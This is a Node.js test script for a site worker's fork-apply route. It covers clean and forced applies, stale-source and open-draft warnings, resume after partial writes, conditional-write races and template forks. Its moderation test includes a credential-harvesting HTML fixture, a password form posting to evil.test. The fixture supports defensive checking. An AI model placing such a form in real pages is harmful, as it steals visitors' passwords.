// Unit drills for POST /api/ops/forks/:id/apply (in-memory bucket + stubbed
// core), per docs/PLAN_FILE_ON_DEMAND.md step 3: clean apply, staleness and
// open-draft warnings + force, moderation rejection (audited), resume after
// partial apply and after lost finalize, concurrent-write conflict via
// conditional puts, and template forks with/without a source artifact.
// Run: node scripts/verify-fork-apply.mjs
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { webcrypto } from 'node:crypto';

import worker from '../workers/site-worker.js';

if (!globalThis.crypto) globalThis.crypto = webcrypto;

// R2-faithful enough for the drills: md5 etags (simple puts), onlyIf via
// Headers (If-None-Match: *) or { etagMatches }, null return on precondition
// failure — the semantics the apply route depends on.
class MemoryBucket {
  objects = new Map(); // key -> { bytes, etag }
  beforePut = null; // hook: simulate a concurrent write between read and put
  async get(key) {
    const stored = this.objects.get(key);
    if (!stored) return null;
    const { bytes, etag } = stored;
    return {
      etag,
      httpEtag: `"${etag}"`,
      body: bytes,
      async json() { return JSON.parse(new TextDecoder().decode(bytes)); },
      async arrayBuffer() { return bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength); },
    };
  }
  async put(key, value, options = {}) {
    if (this.beforePut) { const hook = this.beforePut; this.beforePut = null; hook(); }
    if (value instanceof ReadableStream) value = new Uint8Array(await new Response(value).arrayBuffer());
    const bytes = typeof value === 'string' ? new TextEncoder().encode(value) : new Uint8Array(value);
    const current = this.objects.get(key);
    const onlyIf = options.onlyIf;
    if (onlyIf instanceof Headers) {
      if (onlyIf.get('If-None-Match') === '*' && current) return null;
    } else if (onlyIf?.etagMatches != null) {
      if (!current || current.etag !== onlyIf.etagMatches.replaceAll('"', '')) return null;
    }
    this.objects.set(key, { bytes, etag: createHash('md5').update(bytes).digest('hex') });
    return { key };
  }
  async delete(key) { this.objects.delete(key); }
  async list({ prefix }) {
    return {
      objects: [...this.objects.keys()].filter((k) => k.startsWith(prefix)).map((key) => ({ key })),
      truncated: false,
    };
  }
  etagOf(key) { return this.objects.get(key)?.etag ?? null; }
  text(key) { const s = this.objects.get(key); return s ? new TextDecoder().decode(s.bytes) : null; }
}

const SESSION = 'apply-test-session';
const WORKSPACE = 'ffffffff-1111-2222-3333-444444444444';
const SOURCE_ORG = 'aaaaaaaa-1111-2222-3333-444444444444';
const SOURCE_DESIGN = `dsn_${'s'.repeat(32)}`;
const FORK = `dsn_${'f'.repeat(32)}`;
const SOURCE_BASE = `orgs/${SOURCE_ORG}/designs/${SOURCE_DESIGN}`;
const FORK_BASE = `orgs/${WORKSPACE}/designs/${FORK}`;

// Mutable per-drill state the core stub serves.
let forkRecord;
let applyCalls;

const originalFetch = globalThis.fetch;
globalThis.fetch = async (input, init) => {
  const url = input instanceof URL ? input : new URL(typeof input === 'string' ? input : input.url);
  if (url.pathname === `/v1/admin/designs/${FORK}`) return Response.json(forkRecord);
  if (url.pathname === `/v1/admin/forks/${FORK}/apply`) {
    const body = JSON.parse(init.body);
    applyCalls.push(body);
    if (body.outcome === 'applied') forkRecord.fork_status = 'applied';
    return Response.json({ ...forkRecord });
  }
  if (url.pathname === `/v1/organizations/${SOURCE_ORG}/deploy-check`) return Response.json({ allowed: true });
  throw new Error(`Unexpected core request: ${url.pathname}`);
};

const cleanArtifact = (marker) => JSON.stringify({
  config: { componentPath: ['pages', 'Landing'] },
  content: { components: [] },
  snapshot: { html: `<main>${marker}</main>`, css: '' },
  meta: {},
});

function freshEnv() {
  return {
    ARTIFACTS: new MemoryBucket(),
    ASSETS: { fetch: () => new Response('asset') },
    CORE_URL: 'https://core.archura.test',
    CORE_SERVICE_KEY: 'worker-service-key',
    CORE_INTERNAL_KEY: 'internal-key',
    ROOT_DOMAIN: '',
  };
}

// Seed: fork published in its workspace; source published; fork-time etag
// recorded on the row. Returns the env.
async function seed({ sourceMarker = 'v1', forkMarker = 'fixed', kind = 'published' } = {}) {
  const env = freshEnv();
  if (kind === 'published') {
    await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.json`, cleanArtifact(sourceMarker));
    await env.ARTIFACTS.put(`${SOURCE_BASE}/embed/Landing.js`, `// source ${sourceMarker}`);
  }
  await env.ARTIFACTS.put(`${FORK_BASE}/artifact.json`, cleanArtifact(forkMarker));
  await env.ARTIFACTS.put(`${FORK_BASE}/embed/Landing.js`, `// fork ${forkMarker}`);
  forkRecord = {
    id: FORK, organization_id: WORKSPACE, forked_from: SOURCE_DESIGN, source_org_id: SOURCE_ORG,
    fork_status: 'ready', source_artifact_kind: kind,
    source_etag: kind === 'published' ? env.ARTIFACTS.etagOf(`${SOURCE_BASE}/artifact.json`) : null,
    component_path: 'pages/Landing',
  };
  applyCalls = [];
  return env;
}

const apply = (env, body = {}) =>
  worker.fetch(
    new Request(`https://archura.test/api/ops/forks/${FORK}/apply`, {
      method: 'POST',
      headers: { Cookie: `archura_session=${SESSION}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }),
    env
  );

try {
  // --- clean apply: no warnings, full set copied, archived, audited ---
  let env = await seed();
  let response = await apply(env);
  assert.equal(response.status, 200, `clean apply succeeds: ${await response.clone().text()}`);
  assert.equal(env.ARTIFACTS.text(`${SOURCE_BASE}/artifact.json`), cleanArtifact('fixed'), 'source artifact replaced');
  assert.equal(env.ARTIFACTS.text(`${SOURCE_BASE}/embed/Landing.js`), '// fork fixed', 'source embed replaced');
  let keys = [...env.ARTIFACTS.objects.keys()];
  assert.ok(keys.some((k) => k.startsWith(`history/${SOURCE_BASE}/artifact.json/pre-apply-${FORK}`)), 'pre-apply artifact archive');
  assert.ok(keys.some((k) => k.startsWith(`history/${SOURCE_BASE}/embed/Landing.js/pre-apply-${FORK}`)), 'pre-apply embed archive');
  assert.ok(keys.filter((k) => k.startsWith(`history/${SOURCE_BASE}/artifact.json/`)).length >= 2, 'apply also records normal history');
  assert.deepEqual(applyCalls, [{ outcome: 'applied', forced_warnings: [] }], 'core audited applied');
  assert.equal(forkRecord.fork_status, 'applied', 'row transitioned');

  // --- staleness: source republished since fork → 409, force proceeds ---
  env = await seed();
  await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.json`, cleanArtifact('v2-client-edit'));
  response = await apply(env);
  assert.equal(response.status, 409, 'stale apply blocked');
  assert.deepEqual((await response.json()).warnings, ['stale_source'], 'staleness named');
  const preForce = env.ARTIFACTS.text(`${SOURCE_BASE}/artifact.json`);
  assert.ok(preForce.includes('v2-client-edit'), 'blocked apply changed nothing');
  response = await apply(env, { force: true });
  assert.equal(response.status, 200, 'forced apply succeeds');
  assert.deepEqual(applyCalls.at(-1), { outcome: 'applied', forced_warnings: ['stale_source'] }, 'forced warning audited');
  const archived = env.ARTIFACTS.text(`history/${SOURCE_BASE}/artifact.json/pre-apply-${FORK}`);
  assert.ok(archived.includes('v2-client-edit'), 'archive holds the overwritten client publish');

  // --- open draft: warned on every attempt, including resume ---
  env = await seed();
  await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.draft.json`, cleanArtifact('wip'));
  response = await apply(env);
  assert.equal(response.status, 409, 'open draft blocked');
  assert.deepEqual((await response.json()).warnings, ['open_draft'], 'draft named');

  // --- moderation: blocked, audited as rejection, row stays ready ---
  env = await seed();
  const flagged = JSON.stringify({
    config: { componentPath: ['pages', 'Landing'] }, content: { components: [] },
    snapshot: { html: '<form action="https://evil.test"><input type="password"></form>', css: '' }, meta: {},
  });
  await env.ARTIFACTS.put(`${FORK_BASE}/artifact.json`, flagged);
  response = await apply(env);
  assert.equal(response.status, 409, 'moderation blocked');
  assert.deepEqual(applyCalls, [{ outcome: 'rejected', reason: 'moderation', forced_warnings: [] }], 'rejection audited');
  assert.equal(forkRecord.fork_status, 'ready', 'row unchanged by rejection');
  assert.notEqual(env.ARTIFACTS.text(`${SOURCE_BASE}/artifact.json`), flagged, 'source untouched');

  // --- resume: artifact already applied (crash before embeds/finalize) ---
  env = await seed();
  await env.ARTIFACTS.put(`history/${SOURCE_BASE}/artifact.json/pre-apply-${FORK}`, cleanArtifact('v1'));
  await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.json`, cleanArtifact('fixed')); // first attempt's write landed
  response = await apply(env);
  assert.equal(response.status, 200, 'resume succeeds instead of 409ing on own write');
  assert.equal(env.ARTIFACTS.text(`${SOURCE_BASE}/embed/Landing.js`), '// fork fixed', 'resume finishes embeds');
  const preApply = env.ARTIFACTS.text(`history/${SOURCE_BASE}/artifact.json/pre-apply-${FORK}`);
  assert.equal(preApply, cleanArtifact('v1'), 'resume never overwrites the original archive');

  // --- resume after lost finalize response: row already applied ---
  env = await seed();
  await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.json`, cleanArtifact('fixed'));
  forkRecord.fork_status = 'applied';
  response = await apply(env);
  assert.equal(response.status, 200, 'applied row accepted for resume');
  assert.deepEqual(applyCalls.at(-1).outcome, 'applied', 'idempotent re-finalize');

  // --- concurrency: source changes between read and write → conditional 409 ---
  env = await seed();
  env.ARTIFACTS.beforePut = () => {
    env.ARTIFACTS.objects.set(`${SOURCE_BASE}/artifact.json`, {
      bytes: new TextEncoder().encode(cleanArtifact('concurrent-publish')),
      etag: createHash('md5').update('concurrent').digest('hex'),
    });
  };
  response = await apply(env);
  assert.equal(response.status, 409, 'concurrent write loses the conditional');
  assert.ok(env.ARTIFACTS.text(`${SOURCE_BASE}/artifact.json`).includes('concurrent-publish'), 'concurrent publish preserved');

  // --- template fork: no source artifact → create-only write, no warnings ---
  env = await seed({ kind: 'template' });
  response = await apply(env);
  assert.equal(response.status, 200, 'template apply succeeds');
  assert.equal(env.ARTIFACTS.text(`${SOURCE_BASE}/artifact.json`), cleanArtifact('fixed'), 'template apply creates the artifact');

  // --- template fork gone stale: source gained an artifact since ---
  env = await seed({ kind: 'template' });
  await env.ARTIFACTS.put(`${SOURCE_BASE}/artifact.json`, cleanArtifact('client-published-meanwhile'));
  response = await apply(env);
  assert.equal(response.status, 409, 'template staleness blocked');
  assert.deepEqual((await response.json()).warnings, ['stale_source'], 'template staleness named');

  console.log(
    'worker: fork-apply — clean/forced/blocked applies, audited rejection, resume (partial + lost finalize), conditional-write race, template forks'
  );
} finally {
  globalThis.fetch = originalFetch;
}
